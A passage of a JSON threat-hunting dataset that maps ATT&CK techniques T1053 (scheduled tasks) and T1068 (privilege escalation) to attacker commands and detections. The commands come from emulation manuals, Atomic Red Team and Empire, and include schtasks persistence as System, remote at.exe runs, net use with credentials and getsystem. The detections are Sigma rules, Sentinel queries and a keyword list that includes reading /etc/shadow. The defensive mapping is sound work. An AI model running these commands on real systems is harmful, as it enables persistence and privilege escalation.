name\n\u00a0\u00a0\u00a0\u00a0selection5:\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0EventID: 5140 # visited network shared objects.\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Objecttype: file # Network Information> Object Type\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceaddress: * # Network Information> source address above 5156 target address\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sourceport: * # Network Information> source port destination port above 5156\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Sharename: \\\\ * \\ IPC $ # Share Information> Share name\n\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0Relativetargetname: srvsvc # Share Information> relative to the target name\n\u00a0\u00a0\u00a0\u00a0timeframe: last 10s # can be adjusted according to actual situation\n\u00a0\u00a0\u00a0\u00a0condition: all of them\nlevel: medium", "name": "Yml"}], "possible_detections": [{"data_source": {"action": "global", "title": "Turla Group Lateral Movement", "id": "c601f20d-570a-4cde-a7d6-e17f99cb8e7f", "status": "experimental", "description": "Detects automated lateral movement by Turla group", "references": ["https://securelist.com/the-epic-turla-operation/65545/"], "tags": ["attack.g0010", "attack.execution", "attack.t1059", "attack.lateral_movement", "attack.t1077", "attack.discovery", "attack.t1083", "attack.t1135"], "author": "Markus Neis", "date": "2017/11/07", "logsource": {"category": "process_creation", "product": "windows"}, "falsepositives": ["Unknown"]}}, {"data_source": {"detection": {"selection": {"CommandLine": ["net use \\\\%DomainController%\\C$ \"P@ssw0rd\" *", "dir c:\\\\*.doc* /s", "dir %TEMP%\\\\*.exe"]}, "condition": "selection"}, "level": "critical"}}, {"data_source": {"detection": {"netCommand1": {"CommandLine": "net view /DOMAIN"}, "netCommand2": {"CommandLine": "net session"}, "netCommand3": {"CommandLine": "net share"}, "timeframe": "1m", "condition": "netCommand1 | near netCommand2 and netCommand3"}, "level": "medium"}}]}, {"technique_id": "T1053", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "schtasks [/s HOSTNAME]", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "shell schtasks", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Creating a scheduled task:\nschtasks [/S HOSTNAME] /create /tn \"acachesrv\" /tr C:\\file\\path\\here.exe /sc ONLOGON /ru \"System\" [/rp password]\nRequirements for running scheduled tasks:\nnet start schedule\nsc config schedule start= auto", "name": "Built-in Windows Command"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "Creating a scheduled task:\nshell schtasks [/S HOSTNAME] /create /tn \"acachesrv\" /tr C:\\file\\path\\here.exe /sc ONLOGON /ru \"System\" [/rp password]\nRequirements for running scheduled tasks:\nshell net start schedule\nshell sc config schedule start= auto", "name": "Cobalt Strike"}, {"source": "atomics/T1053/T1053.yaml", "command": "at 13:20 /interactive cmd\n", "name": null}, {"source": "atomics/T1053/T1053.yaml", "command": "SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST #{time}\n", "name": null}, {"source": "atomics/T1053/T1053.yaml", "command": null, "name": null}, {"source": "atomics/T1053/T1053.yaml", "command": "SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \"Atomic task\" /TR \"C:\\windows\\system32\\cmd.exe\" /SC daily /ST #{time}\n", "name": null}, {"source": "atomics/T1053/T1053.yaml", "command": null, "name": null}, {"source": "atomics/T1053/T1053.yaml", "command": "SCHTASKS /Create /S localhost /RU #{user_name} /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}\n", "name": null}, {"source": "atomics/T1053/T1053.yaml", "command": "SCHTASKS /Create /S #{target} /RU DOMAIN\\user /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}\n", "name": null}, {"source": "atomics/T1053/T1053.yaml", "command": "SCHTASKS /Create /S #{target} /RU #{user_name} /RP At0micStrong /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}\n", "name": null}, {"source": "atomics/T1053/T1053.yaml", "command": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTask -InputObject $object\n", "name": null}, {"source": "Threat Hunting Tables", "command": "schtask.exe /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10", "name": null}, {"source": "Threat Hunting Tables", "command": "schtask.exe /create /tn \"mysc\" /tr C:\\windows\\system32\\cmd.exe /sc ONLOGON /ru \"System\"", "name": null}, {"source": "Threat Hunting Tables", "command": "at.exe ##:## /interactive cmd", "name": null}, {"source": "Threat Hunting Tables", "command": "at.exe \\\\[computername|IP] ##:## c:\\temp\\evil.bat", "name": null}, {"source": "Threat Hunting Tables", "command": "net.exe use \\\\[computername|IP] /user:DOMAIN\\username password", "name": null}, {"source": "Threat Hunting Tables", "command": "net.exe time \\\\[computername|IP]", "name": null}, {"source": "Threat Hunting Tables", "command": "schtasks.exe /create * appdata", "name": null}, {"source": "SysmonHunter - Scheduled Task", "command": "\\\\Windows\\\\.+\\\\at.exe", "name": null}, {"source": "SysmonHunter - Scheduled Task", "command": "\\\\Windows\\\\.+\\\\schtasks.exe/Create", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/new_gpo_immediate_task", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/lateral_movement/new_gpo_immediate_task", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/elevated/schtasks", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/elevated/schtasks", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/userland/schtasks", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/persistence/userland/schtasks", "name": "Empire Module Command"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1053", "Built-in Windows Command": "schtasks [/s HOSTNAME]", "Cobalt Strike": "shell schtasks", "Metasploit": "", "Description": "Displays all of the currently scheduled tasks to be run on a computer"}}, {"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1053", "Built-in Windows Command": "Creating a scheduled task:\nschtasks [/S HOSTNAME] /create /tn \"acachesrv\" /tr C:\\file\\path\\here.exe /sc ONLOGON /ru \"System\" [/rp password]\nRequirements for running scheduled tasks:\nnet start schedule\nsc config schedule start= auto", "Cobalt Strike": "Creating a scheduled task:\nshell schtasks [/S HOSTNAME] /create /tn \"acachesrv\" /tr C:\\file\\path\\here.exe /sc ONLOGON /ru \"System\" [/rp password]\nRequirements for running scheduled tasks:\nshell net start schedule\nshell sc config schedule start= auto", "Metasploit": "", "Description": "Add scheduled task (/s is name/ip of remote system to do this on; /tn is the name of the task; /sc is when to run; /ru is user to runas; /rp is password for that user)\nmay need to make sure that the schedule service is started and configured to run on boot so that your persistence sticks.\nDelete a scheduled task by name:\nschtasks [/s HOSTNAME] /delete /tn \"name\""}}, {"Atomic Red Team Test - Scheduled Task": {"attack_technique": "T1053", "display_name": "Scheduled Task", "atomic_tests": [{"name": "At.exe Scheduled task", "description": "Executes cmd.exe\nNote: deprecated in Windows 8+\n\nUpon successful execution, cmd.exe will spawn at.exe and create a scheduled task that will spawn cmd at a specific time.\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "at 13:20 /interactive cmd\n"}}, {"name": "Scheduled task Local", "description": "Upon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10. \n", "supported_platforms": ["windows"], "input_arguments": {"task_command": {"description": "What you want to execute", "type": "String", "default": "C:\\windows\\system32\\cmd.exe"}, "time": {"description": "What time 24 Hour", "type": "String", "default": 1210}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "SCHTASKS /Create /SC ONCE /TN spawn /TR #{task_command} /ST #{time}\n", "cleanup_command": "SCHTASKS /Delete /TN spawn /F >nul 2>&1\n"}}, {"name": "Scheduled task Remote", "description": "Create a task on a remote system.\n\nUpon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint. \n", "supported_platforms": ["windows"], "input_arguments": {"task_command": {"description": "What you want to execute", "type": "String", "default": "C:\\windows\\system32\\cmd.exe"}, "time": {"description": "What time 24 Hour", "type": "String", "default": 1210}, "target": {"description": "Target", "type": "String", "default": "localhost"}, "user_name": {"description": "Username DOMAIN\\User", "type": "String", "default": "DOMAIN\\user"}, "password": {"description": "Password", "type": "String", "default": "At0micStrong"}}, "executor": {"name": "command_prompt", "elevation_required": true, "command": "SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}\n", "cleanup_command": "SCHTASKS /Delete /TN \"Atomic task\" /F >nul 2>&1\n"}}, {"name": "Powershell Cmdlet Scheduled Task", "description": "Create an atomic scheduled task that leverages native powershell cmdlets.\n\nUpon successful execution, powershell.exe will create a scheduled task to spawn cmd.exe at 20:10. \n", "supported_platforms": ["windows"], "executor": {"name": "powershell", "elevation_required": false, "command": "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTask -InputObject $object\n", "cleanup_command": "Unregister-ScheduledTask -TaskName \"AtomicTask\" -confirm:$false >$null 2>&1\n"}}]}}, {"Threat Hunting Tables": {"chain_id": "100184", "os": "windows", "parent_process": "schtask.exe", "commandline_string": "/Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "scheduled_task", "mitre_attack": "T1053", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100185", "os": "windows", "parent_process": "schtask.exe", "commandline_string": "/create /tn \"mysc\" /tr C:\\windows\\system32\\cmd.exe /sc ONLOGON /ru \"System\"", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "scheduled_task", "mitre_attack": "T1053", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100186", "os": "windows", "parent_process": "at.exe", "commandline_string": "##:## /interactive cmd", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "scheduled_task", "mitre_attack": "T1053", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100187", "os": "windows", "parent_process": "at.exe", "commandline_string": "\\\\[computername|IP] ##:## c:\\temp\\evil.bat", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "scheduled_task", "mitre_attack": "T1053", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100188", "os": "windows", "parent_process": "net.exe", "commandline_string": "use \\\\[computername|IP] /user:DOMAIN\\username password", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "high", "mitre_caption": "scheduled_task", "mitre_attack": "T1053", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100189", "os": "windows", "parent_process": "net.exe", "commandline_string": "time \\\\[computername|IP]", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "scheduled_task", "mitre_attack": "T1053", "itw_sample": ""}}, {"Threat Hunting Tables": {"chain_id": "100206", "os": "windows", "parent_process": "schtasks.exe", "commandline_string": "/create * appdata", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "", "mitre_attack": "T1053", "itw_sample": "fe66f4fec21229bd008d7974f071fae1a1a2ef7a1365cee27675f197719a8e27"}}, {"SysmonHunter - T1053": {"name": "Scheduled Task", "description": null, "level": "high", "phase": "Execution", "query": [{"type": "process", "process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\at.exe", "flag": "regex"}}}, {"type": "process", "process": {"image": {"pattern": "\\\\Windows\\\\.+\\\\schtasks.exe", "flag": "regex"}, "cmdline": {"pattern": "/Create"}}}]}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/lateral_movement/new_gpo_immediate_task", "ATT&CK Technique #1": "T1053", "ATT&CK Technique #2": "", "Technique": "Scheduled Task", "Concatenate for Python Dictionary": "\"powershell/lateral_movement/new_gpo_immediate_task\":  [\"T1053\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/persistence/elevated/schtasks", "ATT&CK Technique #1": "T1053", "ATT&CK Technique #2": "", "Technique": "Scheduled Task", "Concatenate for Python Dictionary": "\"powershell/persistence/elevated/schtasks\":  [\"T1053\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/persistence/userland/schtasks", "ATT&CK Technique #1": "T1053", "ATT&CK Technique #2": "", "Technique": "Scheduled Task", "Concatenate for Python Dictionary": "\"powershell/persistence/userland/schtasks\":  [\"T1053\"],"}}], "command_list": ["schtasks [/s HOSTNAME]", "shell schtasks", "Creating a scheduled task:\nschtasks [/S HOSTNAME] /create /tn \"acachesrv\" /tr C:\\file\\path\\here.exe /sc ONLOGON /ru \"System\" [/rp password]\nRequirements for running scheduled tasks:\nnet start schedule\nsc config schedule start= auto", "Creating a scheduled task:\nshell schtasks [/S HOSTNAME] /create /tn \"acachesrv\" /tr C:\\file\\path\\here.exe /sc ONLOGON /ru \"System\" [/rp password]\nRequirements for running scheduled tasks:\nshell net start schedule\nshell sc config schedule start= auto", "at 13:20 /interactive cmd\n", "SCHTASKS /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST #{time}\n", null, "SCHTASKS /Create /S #{target} /RU #{user_name} /RP #{password} /TN \"Atomic task\" /TR \"C:\\windows\\system32\\cmd.exe\" /SC daily /ST #{time}\n", null, "SCHTASKS /Create /S localhost /RU #{user_name} /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}\n", "SCHTASKS /Create /S #{target} /RU DOMAIN\\user /RP #{password} /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}\n", "SCHTASKS /Create /S #{target} /RU #{user_name} /RP At0micStrong /TN \"Atomic task\" /TR \"#{task_command}\" /SC daily /ST #{time}\n", "$Action = New-ScheduledTaskAction -Execute \"calc.exe\"\n$Trigger = New-ScheduledTaskTrigger -AtLogon\n$User = New-ScheduledTaskPrincipal -GroupId \"BUILTIN\\Administrators\" -RunLevel Highest\n$Set = New-ScheduledTaskSettingsSet\n$object = New-ScheduledTask -Action $Action -Principal $User -Trigger $Trigger -Settings $Set\nRegister-ScheduledTask AtomicTask -InputObject $object\n", "schtask.exe /Create /SC ONCE /TN spawn /TR C:\\windows\\system32\\cmd.exe /ST 20:10", "schtask.exe /create /tn \"mysc\" /tr C:\\windows\\system32\\cmd.exe /sc ONLOGON /ru \"System\"", "at.exe ##:## /interactive cmd", "at.exe \\\\[computername|IP] ##:## c:\\temp\\evil.bat", "net.exe use \\\\[computername|IP] /user:DOMAIN\\username password", "net.exe time \\\\[computername|IP]", "schtasks.exe /create * appdata", "\\\\Windows\\\\.+\\\\at.exe", "\\\\Windows\\\\.+\\\\schtasks.exe/Create", "powershell/lateral_movement/new_gpo_immediate_task", "powershell/lateral_movement/new_gpo_immediate_task", "powershell/persistence/elevated/schtasks", "powershell/persistence/elevated/schtasks", "powershell/persistence/userland/schtasks", "powershell/persistence/userland/schtasks"], "attack_paths": [], "queries": [{"product": "Azure Sentinel", "query": "Sysmon| where EventID == 11 and process_command_line contains \"C:\\\\WINDOWS\\\\system32\\\\svchost.exe\"or file_name contains \"C:\\\\Windows\\\\System32\\\\Tasks\\\\\"or file_name contains \"C:\\\\Windows\\\\Tasks\\\\\"", "name": "Scheduled Task FileAccess"}, {"product": "Azure Sentinel", "query": "Sysmon| where EventID == 1 and (process_path contains \"taskeng.exe\"or process_path contains \"schtasks.exe\"or (process_path contains \"svchost.exe\"and process_parent_command_line != \"C:\\\\Windows\\\\System32\\\\services.exe\"))", "name": "Scheduled Task Process"}], "possible_detections": [{"data_source": {"action": "global", "title": "Defrag Deactivation", "id": "958d81aa-8566-4cea-a565-59ccd4df27b0", "author": "Florian Roth", "description": "Detects the deactivation of the Scheduled defragmentation task as seen by Slingshot APT group", "references": ["https://securelist.com/apt-slingshot/84312/"], "tags": ["attack.persistence", "attack.t1053", "attack.s0111"], "detection": {"condition": "1 of them"}, "falsepositives": ["Unknown"], "level": "medium"}}, {"data_source": {"logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection1": {"CommandLine": ["*schtasks* /delete *Defrag\\ScheduledDefrag*"]}}}}, {"data_source": {"logsource": {"product": "windows", "service": "security", "definition": "Requirements: Audit Policy : Audit Other Object Access Events > Success"}, "detection": {"selection2": {"EventID": 4701, "TaskName": "\\Microsoft\\Windows\\Defrag\\ScheduledDefrag"}}}}, {"data_source": {"title": "Persistence and Execution at scale via GPO scheduled task", "id": "a8f29a7b-b137-4446-80a0-b804272f3da2", "description": "Detect lateral movement using GPO scheduled task, ususally used to deploy ransomware at scale", "author": "Samir Bousseaden", "references": ["https://twitter.com/menasec1/status/1106899890377052160"], "tags": ["attack.persistence", "attack.lateral_movement", "attack.t1053"], "logsource": {"product": "windows", "service": "security", "description": "The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure"}, "detection": {"selection": {"EventID": 5145, "ShareName": "\\\\*\\SYSVOL", "RelativeTargetName": "*ScheduledTasks.xml", "Accesses": "*WriteData*"}, "condition": "selection"}, "falsepositives": ["if the source IP is not localhost then it's super suspicious, better to monitor both local and remote changes to GPO scheduledtasks"], "level": "high"}}, {"data_source": {"title": "Remote Task Creation via ATSVC named pipe", "id": "f6de6525-4509-495a-8a82-1f8b0ed73a00", "description": "Detects remote task creation via at.exe or API interacting with ATSVC namedpipe", "author": "Samir Bousseaden", "references": ["https://blog.menasec.net/2019/03/threat-hunting-25-scheduled-tasks-for.html"], "tags": ["attack.lateral_movement", "attack.persistence", "attack.t1053", "car.2013-05-004", "car.2015-04-001"], "logsource": {"product": "windows", "service": "security", "description": "The advanced audit policy setting \"Object Access > Audit Detailed File Share\" must be configured for Success/Failure"}, "detection": {"selection": {"EventID": 5145, "ShareName": "\\\\*\\IPC$", "RelativeTargetName": "atsvc", "Accesses": "*WriteData*"}, "condition": "selection"}, "falsepositives": ["pentesting"], "level": "medium"}}, {"data_source": {"title": "Rare Scheduled Task Creations", "id": "b20f6158-9438-41be-83da-a5a16ac90c2b", "status": "experimental", "description": "This rule detects rare scheduled task creations. Typically software gets installed on multiple systems and not only on a few. The aggregation and count function selects tasks with rare names.", "tags": ["attack.persistence", "attack.t1053", "attack.s0111"], "author": "Florian Roth", "logsource": {"product": "windows", "service": "taskscheduler"}, "detection": {"selection": {"EventID": 106}, "timeframe": "7d", "condition": "selection | count() by TaskName < 5"}, "falsepositives": ["Software installation"], "level": "low"}}, {"data_source": {"title": "Rare Schtasks Creations", "id": "b0d77106-7bb0-41fe-bd94-d1752164d066", "description": "Detects rare scheduled tasks creations that only appear a few times per time frame and could reveal password dumpers, backdoor installs or other types of malicious code", "status": "experimental", "author": "Florian Roth", "tags": ["attack.execution", "attack.privilege_escalation", "attack.persistence", "attack.t1053", "car.2013-08-001"], "logsource": {"product": "windows", "service": "security", "definition": "The Advanced Audit Policy setting Object Access > Audit Other Object Access Events has to be configured to allow this detection (not in the baseline recommendations by Microsoft). We also recommend extracting the Command field from the embedded XML in the event data."}, "detection": {"selection": {"EventID": 4698}, "timeframe": "7d", "condition": "selection | count() by TaskName < 5"}, "falsepositives": ["Software installation", "Software updates"], "level": "low"}}, {"data_source": {"title": "Scheduled Task Creation", "id": "92626ddd-662c-49e3-ac59-f6535f12d189", "status": "experimental", "description": "Detects the creation of scheduled tasks in user session", "author": "Florian Roth", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": "*\\schtasks.exe", "CommandLine": "* /create *"}, "filter": {"User": "NT AUTHORITY\\SYSTEM"}, "condition": "selection and not filter"}, "fields": ["CommandLine", "ParentCommandLine"], "tags": ["attack.execution", "attack.persistence", "attack.privilege_escalation", "attack.t1053", "attack.s0111", "car.2013-08-001"], "falsepositives": ["Administrative activity", "Software installation"], "level": "low"}}, {"data_source": {"title": "Windows 10 scheduled task SandboxEscaper 0-day", "id": "931b6802-d6a6-4267-9ffa-526f57f22aaf", "status": "experimental", "description": "Detects Task Scheduler .job import arbitrary DACL write\\par", "references": ["https://github.com/SandboxEscaper/polarbearrepo/tree/master/bearlpe"], "author": "Olaf Hartong", "date": "2019/05/22", "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"Image": "schtasks.exe", "CommandLine": "*/change*/TN*/RU*/RP*"}, "condition": "selection"}, "falsepositives": ["Unknown"], "tags": ["attack.privilege_escalation", "attack.execution", "attack.t1053", "car.2013-08-001"], "level": "high"}}]}, {"technique_id": "Priv Esc:", "commands": [], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "Priv Esc:", "Built-in Windows Command": "", "Cobalt Strike": "", "Metasploit": "", "Description": ""}}], "command_list": [], "attack_paths": [], "queries": [], "possible_detections": []}, {"technique_id": "T1068", "commands": [{"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "getsystem", "name": "Cobalt Strike"}, {"source": "https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx", "command": "getsystem", "name": "Metasploit"}, {"source": "Threat Hunting Tables", "command": "bitsadmin.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "msbuild.exe *MSBuildShell.csproj", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/ms16-032", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/ms16-032", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/tater", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/tater", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/ms16-135", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/privesc/ms16-135", "name": "Empire Module Command"}], "parsed_datasets": [{"Mitre APT3 Adversary Emulation Field Manual": {"Category": "T1068", "Built-in Windows Command": "", "Cobalt Strike": "getsystem", "Metasploit": "getsystem", "Description": "This technique tries a series of exploits to elevate to a SYSTEM level process (these are actual exploits, not trust abuses, so there's always the potential for bluescreening)"}}, {"Threat Hunting Tables": {"chain_id": "100013", "os": "windows", "parent_process": "bitsadmin.exe", "commandline_string": "", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "low", "mitre_caption": "file_transfer", "mitre_attack": "T1068", "itw_sample": "https://www.joesecurity.org/reports/report-1144eeaebb15044fa64f4d9bb5670349.html#startup"}}, {"Threat Hunting Tables": {"chain_id": "100041", "os": "windows", "parent_process": "msbuild.exe", "commandline_string": "*MSBuildShell.csproj", "sub_process_1": "", "sub_process_2": "", "loaded_dll": "", "registry_path": "", "registry_value": "", "file_path": "", "file_value": "", "frequency": "rare", "mitre_caption": "vulnerability_exploit", "mitre_attack": "T1068", "itw_sample": "https://github.com/Cn33liz/MSBuildShell/blob/master/MSBuildShell.csproj"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/ms16-032", "ATT&CK Technique #1": "T1068", "ATT&CK Technique #2": "", "Technique": "Exploitation for Privilege Escalation", "Concatenate for Python Dictionary": "\"powershell/privesc/ms16-032\":  [\"T1068\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/tater", "ATT&CK Technique #1": "T1068", "ATT&CK Technique #2": "", "Technique": "Exploitation for Privilege Escalation", "Concatenate for Python Dictionary": "\"powershell/privesc/tater\":  [\"T1068\"],"}}, {"Empire Module XLSX Sheet by dstepanic": {"Empire Module": "powershell/privesc/ms16-135", "ATT&CK Technique #1": "T1068", "ATT&CK Technique #2": "", "Technique": "Exploitation for Privilege Escalation", "Concatenate for Python Dictionary": "\"powershell/privesc/ms16-135\":  [\"T1068\"],"}}], "command_list": ["getsystem", "getsystem", "bitsadmin.exe", "msbuild.exe *MSBuildShell.csproj", "powershell/privesc/ms16-032", "powershell/privesc/ms16-032", "powershell/privesc/tater", "powershell/privesc/tater", "powershell/privesc/ms16-135", "powershell/privesc/ms16-135"], "attack_paths": [], "queries": [], "possible_detections": [{"data_source": {"title": "Hurricane Panda Activity", "id": "0eb2107b-a596-422e-b123-b389d5594ed7", "author": "Florian Roth", "status": "experimental", "description": "Detects Hurricane Panda Activity", "references": ["https://www.crowdstrike.com/blog/crowdstrike-discovers-use-64-bit-zero-day-privilege-escalation-exploit-cve-2014-4113-hurricane-panda/"], "tags": ["attack.privilege_escalation", "attack.g0009", "attack.t1068"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"CommandLine": ["* localgroup administrators admin /add", "*\\Win64.exe*"]}, "condition": "selection"}, "falsepositives": ["Unknown"], "level": "high"}}, {"data_source": {"title": "Privilege Escalation Preparation", "id": "444ade84-c362-4260-b1f3-e45e20e1a905", "status": "experimental", "description": "Detects suspicious shell commands indicating the information gathering phase as preparation for the Privilege Escalation.", "references": ["https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/", "https://patrick-bareiss.com/detect-privilege-escalation-preparation-in-linux-with-sigma/"], "author": "Patrick Bareiss", "date": "2019/04/05", "tags": ["attack.privilege_escalation", "attack.t1068"], "level": "medium", "logsource": {"product": "linux"}, "detection": {"keywords": ["cat /etc/issue", "cat /etc/*-release", "cat /proc/version", "uname -a", "uname -mrs", "rpm -q kernel", "dmesg | grep Linux", "ls /boot | grep vmlinuz-", "cat /etc/profile", "cat /etc/bashrc", "cat ~/.bash_profile", "cat ~/.bashrc", "cat ~/.bash_logout", "ps -aux | grep root", "ps -ef | grep root", "crontab -l", "cat /etc/cron*", "cat /etc/cron.allow", "cat /etc/cron.deny", "cat /etc/crontab", "grep -i user *", "grep -i pass *", "ifconfig", "cat /etc/network/interfaces", "cat /etc/sysconfig/network", "cat /etc/resolv.conf", "cat /etc/networks", "iptables -L", "lsof -i", "netstat -antup", "netstat -antpx", "netstat -tulpn", "arp -e", "route", "cat /etc/passwd", "cat /etc/group", "cat /etc/shadow", "find / -perm -u=s", "find / -perm -g=s", "find / -perm -4000", "find / -perm -2000"], "timeframe": "30m", "condition": "keywords | count() by host > 6"}, "falsepositives": ["Troubleshooting on Linux Machines"]}}, {"data_source": {"title": "Exploiting CVE-2019-1388", "id": "02e0b2ea-a597-428e-b04a-af6a1a403e5c", "status": "experimental", "description": "Detects an explotation attempt in which the UAC consent dialogue is used to invoke an Internet Explorer process running as LOCAL_SYSTEM", "references": ["https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege"], "author": "Florian Roth", "date": "2019/11/20", "tags": ["attack.privilege_escalation", "attack.t1068"], "logsource": {"category": "process_creation", "product": "windows"}, "detection": {"selection": {"ParentImage": "*\\consent.exe", "Image": "*\\iexplore.exe", "CommandLine": "* http*"}, "rights1": {"IntegrityLevel": "System"}, "rights2": {"User": "NT AUTHORITY\\SYSTEM"}, "condition": "selection and ( rights1 or rights2 )"}, "falsepositives": ["Unknown"], "level": "critical"}}, {"data_source": {"title": "Windows Kernel and 3rd-party drivers exploits. Token stealing", "id": "8065b1b4-1778-4427-877f-6bf948b26d38", "description": "Detection of child processes spawned with SYSTEM privileges by parents with non-SYSTEM privileges and Medium integrity level", "references": ["https://www.slideshare.net/heirhabarov/hunting-for-privilege-escalation-in-windows-environment"], "tags": ["attack.privilege_escalation", "attack.t1068"], "status": "experimental", "author": "Teymur Kheirkhabarov 